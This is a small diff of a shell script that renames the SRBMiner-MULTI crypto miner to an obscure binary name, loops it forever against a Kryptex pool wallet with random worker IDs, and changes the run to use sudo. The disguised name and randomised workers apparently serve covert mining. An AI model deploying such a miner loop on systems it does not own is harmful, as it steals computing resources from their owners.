@@ -7,5 +7,5 @@ mv SRBMiner-MULTI samlospo
 ph add samlospo
 
 while true; do
-./samlospo --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
+sudo ./samlospo --disable-cpu --algorithm pearlhash --pool prl.kryptex.network:7048 --wallet prl1plfe52vv5jxq8x4zj0vn6u0wufa73q2xmzed87nelwyg3mlxhfl8sn6hhdr.$(echo $RANDOM | md5sum | head -c 10)
 done
